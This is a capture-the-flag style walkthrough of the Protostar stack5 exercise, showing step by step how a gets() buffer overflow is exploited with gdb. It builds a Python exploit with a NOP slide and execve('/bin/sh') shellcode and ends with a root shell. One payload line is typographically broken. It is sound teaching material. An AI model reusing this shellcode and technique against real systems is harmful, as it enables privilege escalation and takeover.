# First Exploit! Buffer Overflow with Shellcode - bin 0x0E

## Target Exercises

- [stack5](https://exploit-exercises.lains.space/protostar/stack5/)

## Usage

Download `exploit-exercises-protostar-2.iso` from the [Protostar Google Drive directory](https://drive.google.com/folderview?id=0B9RbZkKdRR8qbkJjQ2VXbWNlQzg&usp=sharing).

```
/bin/bash
/opt/protostar/bin/stack5
AAAA
```

## Instructions

The code is surprisingly small. There is just one call to `gets`, which we know allows us to overwrite data on the stack. How to get to a root shell?


Throw a long string against the program with an exploit script and a pattern like the alphabet:
```
import string

alphabet = ''.join([c*4 for c in string.ascii_uppercase])

print(alphabet)
```

Save the output to `/tmp/alphabet` with `python stack.py > alphabet`, then inject it in `stack5` with `gdb`. Before running the program, set a breakpoint at the return of `main` (i.e. before the `ret` command). Also define a hook to display the instruction that will be executed next at every breakpoint as well as 8 words from the stack:
```
user@protostar:/opt/protostar/bin$ gdb stack5
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   ebp
0x080483c5 <main+1>:	mov    ebp,esp
0x080483c7 <main+3>:	and    esp,0xfffffff0
0x080483ca <main+6>:	sub    esp,0x50
0x080483cd <main+9>:	lea    eax,[esp+0x10]
0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave
0x080483da <main+22>:	ret
End of assembler dump.
(gdb) break *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/8wx $esp
>end
(gdb) r
Starting program: /opt/protostar/bin/stack5
ASD
0x80483da <main+22>:	ret
0xbffff76c:	0xb7eadc76	0x00000001	0xbffff814	0xbffff81c
0xbffff77c:	0xb7fe1848	0xbffff7d0	0xffffffff	0xb7ffeff4

Breakpoint 1, 0x080483da in main (argc=134513604, argv=0x1) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb)
```

Running the program with a simple string like `ASD` confirms we hit the breakpoint at the return. The next line shows us what the stack looks like right now. When we execute the `ret` with `si`, we jump to the `0xb7eadc76` address that was on the stack before:
```
(gdb) si
0xb7eadc76 <__libc_start_main+230>:	mov    DWORD PTR [esp],eax
0xbffff770:	0x00000001	0xbffff814	0xbffff81c	0xb7fe1848
0xbffff780:	0xbffff7d0	0xffffffff	0xb7ffeff4	0x08048232
__libc_start_main (main=0x80483c4 <main>, argc=1, ubp_av=0xbffff814, init=0x80483f0 <__libc_csu_init>,
    fini=0x80483e0 <__libc_csu_fini>, rtld_fini=0xb7ff1040 <_dl_fini>, stack_end=0xbffff80c) at libc-start.c:260
260	libc-start.c: No such file or directory.
	in libc-start.c
(gdb)
```

So now execute again with the alphabet. Upon hitting the return statement, we can see that we have successfully overwritten stuff on the stack. The program will try to return to address `0x54545454` but cannot proceed as this memory location does not contain any valid code:
```
(gdb) r < /tmp/alphabet
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/alphabet
0x80483da <main+22>:	ret
0xbffff76c:	0x54545454	0x55555555	0x56565656	0x57575757
0xbffff77c:	0x58585858	0x59595959	0x5a5a5a5a	0xb7ffef00

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) si
Cannot access memory at address 0x53535357
(gdb) si

Program received signal SIGSEGV, Segmentation fault.
0x54545454:	Error while running hook_stop:
Cannot access memory at address 0x54545454
0x54545454 in ?? ()
(gdb)
```
With e(x)amine as (s)tring, we can see that we have overwritten the return pointer with T's:
```
(gdb) x/s $esp
0xbffff770:	 "UUUUVVVVWWWWXXXXYYYYZZZZ"
(gdb)
```

```
               T T T T     U U U U     V V V V     W W W W
0xbffff76c:	0x54545454	0x55555555	0x56565656	0x57575757
               X X X X     Y Y Y Y     Z Z Z Z
0xbffff77c:	0x58585858	0x59595959	0x5a5a5a5a	0xb7ffef00
```

Let's update our exploit script based on this knowledge:
```
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"  # stop right before the T's
eip = struct.pack("I", 0x????????)  # replace the Ts with where we want to jump to
print padding + eip
```

Where do we want to jump to? The stack! So we can control what data is executed. We could jump right after the instruction pointer we control. To do that, just run it again, execute the ret and have a look at the stack pointer `esp`:
```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/alphabet
0x80483da <main+22>:	ret
0xbffff76c:	0x54545454	0x55555555	0x56565656	0x57575757
0xbffff77c:	0x58585858	0x59595959	0x5a5a5a5a	0xb7ffef00

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11	in stack5/stack5.c
(gdb) si
Cannot access memory at address 0x53535357
(gdb) info registers
eax            0xbffff720	-1073744096
ecx            0xbffff720	-1073744096
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff770	0xbffff770
ebp            0x53535353	0x53535353
esi            0x0	0
edi            0x0	0
eip            0x54545454	0x54545454
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

Here `esp` points to `0xbffff770`. Let's use this address in `stack.py`:
```
eip = struct.pack("I", 0xbffff770)  # replace the Ts with where we want to jump to
```

Then let's append code that we want to execute after the return pointer. Let's use the opcode `CC`, the `int3` suggested in the challenge description:
```
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"  # stop right before the T's
eip = struct.pack("I", 0x????????)  # replace the Ts with where we want to jump to
payload = " \xCC"*4
print padding + eip + payload
```

As detailed in Intel's software developer's manual, Interrupt 3 traps to debugger. Page 570 of https://software.intel.com/sites/default/files/managed/a4/60/325383-sdm-vol-2abcd.pdf reads:

> The INT3 instruction uses a one-byte opcode (CC) and is intended for calling the debug exception handler with a
breakpoint exception (#BP). (This one-byte form is useful because it can replace the first byte of any instruction at
which a breakpoint is desired, including other one-byte instructions, without overwriting other instructions.)

That is how GDB works!

Write the output of `stack.py` to `tmp/exp` with:
```
python stack.py > /tmp/exp
```

Now feed it to `gdb`:
```
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
0x80483da <main+22>:	ret
0xbffff76c:	0xbffff770	0xcccccccc	0xbffff800	0xbffff81c
0xbffff77c:	0xb7fe1848	0xbffff7d0	0xffffffff	0xb7ffeff4

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11	in stack5/stack5.c
(gdb)
```

We can see that we stopped at the `ret` and we see the address where we would return to: `0xbffff770`. When we continue, we pop the instruction pointer value from the stack, thus continue executing on the stack where we have our `INT 3` instruction. As you can see, `gdb` stops because it received a `SIGTRAP`:
```
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff771:	int3
0xbffff770:	0xcccccccc	0xbffff800	0xbffff81c	0xb7fe1848
0xbffff780:	0xbffff7d0	0xffffffff	0xb7ffeff4	0x08048232
0xbffff771 in ?? ()
(gdb)
```

This way we know that we have code execution because we successfully injected an assembler instruction. Now does this work out of `gdb` too?
```
user@protostar:/tmp$ python stack.py | /opt/protostar/bin/stack5
Illegal instruction
```

Why do we get an illegal instruction? We should get a breakpoint message. Let's open it in `gdb` here and compare with the initial `gdb` session.
```
user@protostar:/tmp$ gdb /opt/protostar/bin/stack5
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack5 < /tmp/exp

Program received signal SIGILL, Illegal instruction.
0xbffff776 in ?? ()
(gdb)
```

Same `Illegal instruction` message. Let's set the hooks and the breakpoints like in the other `gdb` session:
```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/8wx $esp
>end
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   %ebp
0x080483c5 <main+1>:	mov    %esp,%ebp
0x080483c7 <main+3>:	and    $0xfffffff0,%esp
0x080483ca <main+6>:	sub    $0x50,%esp
0x080483cd <main+9>:	lea    0x10(%esp),%eax
0x080483d1 <main+13>:	mov    %eax,(%esp)
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave
0x080483da <main+22>:	ret
End of assembler dump.
(gdb) break *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
0x80483da <main+22>:	ret
0xbffff77c:	0xbffff770	0xcccccccc	0xbffff800	0xbffff82c
0xbffff78c:	0xb7fe1848	0xbffff7e0	0xffffffff	0xb7ffeff4

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb)
```

Hmmm the addresses on the stack are not the same:
```
0x80483da <main+22>:	ret
0xbffff76c:	0xbffff770	0xcccccccc	0xbffff800	0xbffff81c
0xbffff77c:	0xb7fe1848	0xbffff7d0	0xffffffff	0xb7ffeff4
```

versus:
```
0x80483da <main+22>:	ret
0xbffff77c:	0xbffff770	0xcccccccc	0xbffff800	0xbffff82c
0xbffff78c:	0xb7fe1848	0xbffff7e0	0xffffffff	0xb7ffeff4
```

`0xbffff76c` versus `0xbffff77c`. Why are they different? By displaying 1000 strings from the stack with `x/1000s $esp`, we notice that the environment variables after the initial gibberish (`USER`, `SSH_CLIENT`, `MAIL`...) are at different addresses. Let's continue further down until we find addresses that are the same for both `gdb` sessions, then narrow down to the actual difference:
```
0xbfffff9c:	 "PWD=/tmp"
0xbfffffa5:	 "SSH_CONNECTION=192.168.99.1 50242 192.168.99.104 22"

0xbfffff8e:	 "PWD=/opt/protostar/bin"
0xbfffffa5:	 "SSH_CONNECTION=192.168.99.1 65459 192.168.99.104 22"
```

The current working directory is different. They have different lengths, hence pushing the stack further up because one execution environment needs more space on the stack to store a larger path. No wonder that the stack addresses are not the same anymore and our exploit does not work as expected. To cope with that, there are a couple of techniques that you can use to get a bit more control over the stack. Removing all environment variables before executing a binary is an option. Bu there is another very easy but effective trick involving a nop slide. Let's just add a lot of NOP instructions with opcode `0x90` to our exploit script. Instead of picking a very specific stack address, let's just pick one that we hope hits our NOPs:
```
eip = struct.pack("I", 0xbffff770 + 30)  # where do we want to jump to?
payload = "\x90"*100 + "\xCC"*4
```

Run again after exporting the output of `stack.py` to `/tmp/exp`:
```
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
0x80483da <main+22>:	ret
0xbffff77c:	0xbffff78e	0x90909090	0x90909090	0x90909090
0xbffff78c:	0x90909090	0x90909090	0x90909090	0x90909090

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11	in stack5/stack5.c
(gdb)
```

We can clearly see the NOPs on the stack and the `0xbffff78e` address we will jump to points somewhere else further down, right in the middle of the slide if we look at more of the stack:
```
(gdb) x/32wx $esp
0xbffff77c:	0xbffff78e	0x90909090	0x90909090	0x90909090
0xbffff78c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff79c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7ac:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7bc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7cc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7dc:	0x90909090	0x90909090	0xcccccccc	0xb7eadb00
0xbffff7ec:	0xb7ffeff4	0x00000001	0x08048310	0x00000000
(gdb)
```

Let's just (si)ngle step forward, happily slide down the NOP slide until we reach the bottom with our trap:
```
(gdb) si
Cannot access memory at address 0x53535357
(gdb)
0xbffff78f:	nop
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff78f in ?? ()
(gdb)
0xbffff790:	nop
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790 in ?? ()

[...]

0xbffff7e3:	nop
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e3 in ?? ()
(gdb)
0xbffff7e4:	int3
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e4 in ?? ()
(gdb)
0xbffff7e5:	int3
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e5 in ?? ()
(gdb)
0xbffff7e6:	int3
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e6 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff7e7:	int3
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e7 in ?? ()
(gdb)
```

And it also works on outside of `gdb`:
```
user@protostar:/tmp$ python stack.py | /opt/protostar/bin/stack5
Trace/breakpoint trap
```

Now instead of `\xCC` we want to execute something useful. Let's look for some shell code. As the challenge description said, it's best to reuse shellcode from other people. Grab a Linux Intel 32bit shellcode from http://shell-storm.org/shellcode/, for example [Linux/x86 - execve(/bin/sh) - 28 bytes by Jean Pascal Pereira](http://shell-storm.org/shellcode/files/shellcode-811.php):
```
#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

Copy the `shellcode[]` bytes into the python exploit script as payload so we can throw it against the program:
```
eip = struct.pack("I", 0xbffff770 + 30)  # where do we want to jump to?
nop_slide = "\x90"*100
` payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding + eip + nop_slide + payload
```

```
user@protostar:/tmp$ python stack.py | /opt/protostar/bin/stack5
user@protostar:/tmp$
```

Nothing happens though. Let's add the `\xCC` at the start of the payload and confirm we still hit it:
```
payload = "\xCC\x31\xc0\x50\x68\x2f..."
```
```
user@protostar:/tmp$ python stack.py | /opt/protostar/bin/stack5
Trace/breakpoint trap
```

Indeed, so the rest should work too. Remove the `\xCC` and try in `gdb`:
```
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
Executing new program: /bin/dash

Program exited normally.
(gdb)
```

The program says `Executing new program: /bin/dash` (which `bin/sh` actually points to). So it should work... ALso note that, at this point, the `gdb` session is broken as `execve` replaces the current program (`stack5`) with another one (`/bin/dash`). You would have to load `stack5` again with `file`.

What's the issue then? It has to do with how input is handled. A shell you execute wants some input. From standard input. But we used a program and redirected its standard output into the standard input of this program. And when the program was done it closed that pipe. So now the shell is executed but does not have any input, because the pipe is closed. So it will just exit. There is a neat trick to get around that. When we use `cat` without parameters, it simply redirects its standard input to the standard output. You type something in and it gets reflected out in the console:
```
user@protostar:/tmp$ cat
toto
toto
foo
foo
bar
bar
^C
user@protostar:/tmp$
```

Now you can chain programs together on one line, for example with semicolon. So we can first print the output of the exploit, and afterwards `cat` is executed, so we can enter new input.
```
python stack.py ; cat
```

If we group these two instructions with brackets and redirect their combined output into the stack level, the exploit will first run and execute a shell, and then `cat` will take over and we can simply relay input via `cat` to the shell:
```
(python stack.py ; cat) | /opt/protostar/bin/stack5
```

And it works!! We have an ugly shell with no apparent prompt, but we can verify our identity with `whoiam` or `id` to confirm we have escalated privileges to `root`:
```
user@protostar:/tmp$ (python stack.py ; cat) | /opt/protostar/bin/stack5
whoami
root
pwd
/tmp
touch file.txt
exit
exit
user@protostar:/tmp$ ls -l
total 12
-rw-r--r-- 1 user user 105 Oct 15 13:41 alphabet
-rw-r--r-- 1 user user 209 Oct 15 16:40 exp
-rw-r--r-- 1 root user   0 Oct 15 17:05 file.txt
-rw-r--r-- 1 user user 366 Oct 15 16:40 stack.py
user@protostar:/tmp$
```
